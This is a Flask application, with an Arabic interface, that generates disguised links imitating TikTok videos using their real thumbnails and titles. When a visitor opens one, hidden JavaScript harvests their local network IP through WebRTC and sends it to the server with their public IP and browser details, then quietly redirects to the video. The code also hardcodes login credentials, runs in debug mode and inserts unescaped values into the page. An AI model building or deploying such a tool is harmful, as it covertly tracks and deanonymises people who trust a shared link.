from flask import Flask, render_template_string, request, redirect, jsonify, Response
import uuid
import datetime
import sqlite3
import requests
from functools import wraps

app = Flask(__name__)

DB_FILE = "tracker_data.db"
USERNAME = "khaled"
PASSWORD = "ALG@2022"

def init_db():
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS links (
                id TEXT PRIMARY KEY,
                original_url TEXT,
                note TEXT,
                video_title TEXT,
                custom_image TEXT
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS clicks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                link_id TEXT,
                ip TEXT,
                local_ip TEXT,
                device TEXT,
                time TEXT,
                FOREIGN KEY(link_id) REFERENCES links(id)
            )
        ''')
        conn.commit()

init_db()

# دالة ذكية لجلب غلاف الفيديو وعنوانه الحقيقي من تيك توك تلقائياً
def get_tiktok_meta(video_url):
    default_img = "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=600"
    default_title = "TikTok - شاهد مقطع الفيديو الرائج"
    try:
        # استخدام API الرسمي المفتوح من تيك توك لجلب معلومات المعاينة
        api_url = f"https://www.tiktok.com/oembed?url={video_url}"
        response = requests.get(api_url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            title = data.get('title', default_title)
            image = data.get('thumbnail_url', default_img)
            return title, image
    except Exception:
        pass
    return default_title, default_img

def check_auth(username, password):
    return username == USERNAME and password == PASSWORD

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return Response(
                'يجب تسجيل الدخول للوصول إلى لوحة التحكم.', 401,
                {'WWW-Authenticate': 'Basic realm="Login Required"'}
            )
        return f(*args, **kwargs)
    return decorated

HTML_LAYOUT = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>منصتي الذكية لإدارة الروابط</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f6f9; color: #333; margin: 0; padding: 0; }
        .navbar { background-color: #1a252f; color: white; padding: 15px; text-align: center; font-size: 18px; font-weight: bold; }
        .container { max-width: 900px; margin: 15px auto; padding: 15px; box-sizing: border-box; }
        .stats-overview { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-bottom: 20px; }
        .stat-card { background: white; padding: 15px; border-radius: 8px; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border-top: 4px solid #34495e; }
        .stat-card h3 { margin: 0; font-size: 13px; color: #7f8c8d; }
        .stat-card p { margin: 5px 0 0 0; font-size: 20px; font-weight: bold; color: #2c3e50; }
        .create-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.06); margin-bottom: 25px; }
        .create-box h2 { margin-top: 0; font-size: 16px; color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 5px; }
        label { font-weight: bold; display: block; margin-top: 10px; font-size: 14px; color: #555; }
        input[type="text"], input[type="url"] { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
        button { width: 100%; background-color: #3498db; color: white; border: none; padding: 12px; margin-top: 15px; border-radius: 4px; font-size: 15px; font-weight: bold; cursor: pointer; }
        .section-title { font-size: 16px; color: #2c3e50; margin: 20px 0 10px 0; font-weight: bold; }
        .table-wrapper { background: white; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.06); overflow-x: auto; margin-bottom: 25px; }
        .main-table { width: 100%; border-collapse: collapse; font-size: 13px; text-align: center; }
        .main-table th, .main-table td { padding: 12px 10px; border-bottom: 1px solid #edf2f7; }
        .main-table th { background-color: #34495e; color: white; }
        .link-text { color: #3498db; text-decoration: none; word-break: break-all; font-size: 12px; }
        .badge { background: #e74c3c; color: white; padding: 2px 6px; border-radius: 4px; font-weight: bold; }
        .logs-box { background: white; padding: 15px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.06); margin-top: 20px; }
        .logs-table { width: 100%; border-collapse: collapse; font-size: 12px; text-align: center; margin-top: 10px; }
        .logs-table th, .logs-table td { padding: 10px; border: 1px solid #e2e8f0; }
        .logs-table th { background-color: #2c3e50; color: white; }
    </style>
</head>
<body>
    <div class="navbar">📊 لوحة التحكم والإدارة التلقائية (جلب أغلفة الفيديو)</div>
    <div class="container">
        
        <div class="stats-overview">
            <div class="stat-card">
                <h3>إجمالي الروابط المنشأة</h3>
                <p>{{ total_links }}</p>
            </div>
            <div class="stat-card" style="border-top-color: #e74c3c;">
                <h3>إجمالي النقرات المسجلة</h3>
                <p>{{ total_clicks }}</p>
            </div>
        </div>

        <div class="create-box">
            <h2>🔗 إنشاء رابط تتبع جديد (يجلب الغلاف تلقائياً)</h2>
            <form action="/create" method="POST">
                <label>رابط فيديو التيك توك (Original URL):</label>
                <input type="url" name="original_url" placeholder="https://vt.tiktok.com/..." required>
                
                <label>ملاحظة لتمييز الرابط (Note):</label>
                <input type="text" name="note" placeholder="مثال: فسيليتي 11" required>
                
                <button type="submit">توليد الرابط الذكي</button>
            </form>
        </div>

        <div class="section-title">📋 قائمة الروابط النشطة المعاينة تلقائياً</div>
        <div class="table-wrapper">
            <table class="main-table">
                <thead>
                    <tr>
                        <th>الملاحظة (Note)</th>
                        <th>العنوان المستخرج</th>
                        <th>النقرات</th>
                        <th>رابط التمويه المخصص</th>
                        <th>غلاف الفيديو المجلوب</th>
                    </tr>
                </thead>
                <tbody>
                    {% if not links_list %}
                    <tr>
                        <td colspan="5" style="padding: 20px; color: #95a5a6;">لا توجد روابط منشأة حتى الآن.</td>
                    </tr>
                    {% else %}
                        {% for link in links_list %}
                        <tr>
                            <td style="font-weight: bold; color: #2c3e50;">{{ link.note }}</td>
                            <td style="max-width: 150px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">{{ link.video_title }}</td>
                            <td><span class="badge">{{ link.clicks_count }}</span></td>
                            <td><a class="link-text" href="/secure/{{ link.id }}" target="_blank">{{ host_url }}secure/{{ link.id }}</a></td>
                            <td>
                                <img src="{{ link.custom_image }}" width="50" height="40" style="border-radius:4px; object-fit:cover;">
                            </td>
                        </tr>
                        {% endfor %}
                    {% endif %}
                </tbody>
            </table>
        </div>

        <div class="section-title">🔍 سجل النقرات المباشر وتتبع الأجهزة (Logs)</div>
        <div class="logs-box">
            <table class="logs-table">
                <thead>
                    <tr>
                        <th>الرابط (الملاحظة)</th>
                        <th>الوقت (Date/Time)</th>
                        <th>الـ IP العام</th>
                        <th>الـ IP المحلي (LAN)</th>
                        <th>بيانات الهاتف والمتصفح</th>
                    </tr>
                </thead>
                <tbody>
                    {% if not clicks_list %}
                    <tr>
                        <td colspan="5" style="padding: 20px; color: #95a5a6;">بانتظار تسجيل نقرات جديدة...</td>
                    </tr>
                    {% else %}
                        {% for click in clicks_list %}
                        <tr>
                            <td style="background: #fcf8e3; font-weight: bold;">{{ click.note }}</td>
                            <td>{{ click.time }}</td>
                            <td style="color:#e74c3c; font-weight:bold;">{{ click.ip }}</td>
                            <td style="color:#27ae60; font-weight:bold;">{{ click.local_ip }}</td>
                            <td style="font-size:11px; text-align:right; max-width:250px; word-break:break-all;">{{ click.device }}</td>
                        </tr>
                        {% endfor %}
                    {% endif %}
                </tbody>
            </table>
        </div>

    </div>
</body>
</html>
'''

@app.route('/')
@requires_auth
def home():
    with sqlite3.connect(DB_FILE) as conn:
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT l.id, l.original_url, l.note, l.video_title, l.custom_image, COUNT(c.id) as clicks_count 
            FROM links l LEFT JOIN clicks c ON l.id = c.link_id 
            GROUP BY l.id
        ''')
        links_list = cursor.fetchall()
        
        cursor.execute('''
            SELECT c.ip, c.local_ip, c.device, c.time, l.note 
            FROM clicks c JOIN links l ON c.link_id = l.id 
            ORDER BY c.id DESC
        ''')
        clicks_list = cursor.fetchall()
        
        total_links = len(links_list)
        cursor.execute("SELECT COUNT(*) FROM clicks")
        total_clicks = cursor.fetchone()[0]

    return render_template_string(HTML_LAYOUT, links_list=links_list, clicks_list=clicks_list, host_url=request.host_url, total_links=total_links, total_clicks=total_clicks)

@app.route('/create', methods=['POST'])
@requires_auth
def create():
    original_url = request.form.get('original_url')
    note = request.form.get('note')
    
    # استدعاء الدالة لجلب العنوان وصورة الغلاف الحية للفيديو تلقائياً
    video_title, custom_image = get_tiktok_meta(original_url)
    
    link_id = str(uuid.uuid4())[:6].upper()
    
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("INSERT INTO links (id, original_url, note, video_title, custom_image) VALUES (?, ?, ?, ?, ?)", 
                       (link_id, original_url, note, video_title, custom_image))
        conn.commit()
        
    return redirect('/')

@app.route('/secure/<link_id>')
def secure_redirect(link_id):
    with sqlite3.connect(DB_FILE) as conn:
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM links WHERE id = ?", (link_id,))
        link_data = cursor.fetchone()
        
    if link_data:
        title = link_data['video_title']
        description = "شاهد مقطع الفيديو المرفق بجودة عالية عبر تيك توك."
        image_url = link_data['custom_image']
        
        return f'''
        <!DOCTYPE html>
        <html lang="ar">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>{title}</title>
            
            <meta property="og:title" content="{title}">
            <meta property="og:description" content="{description}">
            <meta property="og:image" content="{image_url}">
            <meta property="og:image:secure_url" content="{image_url}">
            <meta property="og:type" content="video.other">
            <meta property="og:image:width" content="600">
            <meta property="og:image:height" content="400">
            
            <script>
                function gatherLocalIPsAndRedirect() {{
                    var detectedIPs = [];
                    window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
                    
                    if (!window.RTCPeerConnection) {{
                        sendData("غير مدعوم");
                        return;
                    }}

                    var pc = new RTCPeerConnection({{ iceServers: [] }});
                    pc.createDataChannel(""); 
                    
                    pc.onicecandidate = function(e) {{
                        if (!e || !e.candidate || !e.candidate.candidate) return;
                        var candidate = e.candidate.candidate;
                        var ipRegex = /([0-9]{{1,3}}(\\.[0-9]{{1,3}}){{3}})/;
                        var mdnsRegex = /([a-f0-9\\-]+\\.local)/i;
                        
                        var match = ipRegex.exec(candidate) || mdnsRegex.exec(candidate);
                        if (match && detectedIPs.indexOf(match[1]) === -1) {{
                            detectedIPs.push(match[1]);
                        }}
                    }};

                    pc.createOffer().then(function(sdp) {{
                        sdp.sdp.split('\\n').forEach(function(line) {{
                            if(line.indexOf('c=IN') === 0 || line.indexOf('a=candidate') === 0) {{
                                var parts = line.split(' ');
                                parts.forEach(function(part){{
                                    if(part.match(/[0-9]{{1,3}}(\\.[0-9]{{1,3}}){{3}}/) || part.match(/\\.local$/)) {{
                                        if(detectedIPs.indexOf(part) === -1) detectedIPs.push(part);
                                    }}
                                }});
                            }}
                        }});
                        pc.setLocalDescription(sdp);
                    }}).catch(function(err) {{ }});

                    setTimeout(function() {{
                        var finalLocalIp = detectedIPs.length > 0 ? detectedIPs.join(" | ") : "مخفي أو مشفر (mDNS)";
                        sendData(finalLocalIp);
                    }}, 1200);
                }}

                function sendData(localIp) {{
                    var xhr = new XMLHttpRequest();
                    xhr.open("POST", "/log-click/{link_id}", true);
                    xhr.setRequestHeader("Content-Type", "application/json");
                    xhr.onreadystatechange = function () {{
                        if (xhr.readyState === 4) {{
                            window.location.href = "{link_data['original_url']}";
                        }}
                    }};
                    xhr.send(JSON.stringify({{ "local_ip": localIp }}));
                }}
                window.onload = gatherLocalIPsAndRedirect;
            </script>
        </head>
        <body style="background:#000; color:#fff; font-family:sans-serif; text-align:center; padding-top:45%;">
            <div>جاري تشغيل مقطع الفيديو... 🎬</div>
        </body>
        </html>
        '''
    return "الرابط غير موجود", 404

@app.route('/log-click/<link_id>', methods=['POST'])
def log_click(link_id):
    data = request.get_json() or {}
    local_ip = data.get('local_ip', 'غير معروف')
    
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip_address and ',' in ip_address:
        ip_address = ip_address.split(',')[0].strip()
        
    user_agent = request.headers.get('User-Agent')
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO clicks (link_id, ip, local_ip, device, time) 
            VALUES (?, ?, ?, ?, ?)
        ''', (link_id, ip_address, local_ip, user_agent, current_time))
        conn.commit()
        
    return jsonify({"status": "success"}), 200

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
